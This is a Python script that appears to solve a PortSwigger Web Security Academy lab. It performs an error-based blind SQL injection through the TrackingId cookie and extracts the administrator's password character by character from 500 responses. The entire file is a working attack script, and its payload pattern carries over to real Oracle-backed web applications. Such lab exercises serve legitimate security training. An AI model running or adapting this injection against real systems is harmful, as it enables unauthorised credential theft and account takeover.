#!/usr/bin/python3

from pwn import *
import requests, time, string, pdb, signal, re

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...")
	sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
main_url='https://0a6300590329cf9980f3e9d700e000d1.web-security-academy.net/'

def makeRequest():
  p1 = log.progress("Blind SQLI")
  p1.status("Iniciando ataque de fuerza bruta basado basado en condiciones por error")

  p2 = log.progress("Data")
  p3 = log.progress("Character")
  time.sleep(2)
  p4 = log.progress("Prueba")
  final_data = ""

  x = requests.get(main_url)
  cookie = x.cookies
  trackingid = cookie.get('TrackingId')
  session = cookie.get('session')
  characters = string.ascii_lowercase + string.digits

  for position in range(1,25):
    for character in characters:
      sqli="'||(SELECT case when substr(password,%d,1)='%c' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character)
      cookies = {'TrackingId': trackingid + sqli, 'session': session}
      p3.status(character)
      r = requests.get(main_url, cookies=cookies)
      if r.status_code == 500:
        final_data += character
        p2.status(final_data)
        break
if __name__ == '__main__':
  makeRequest()
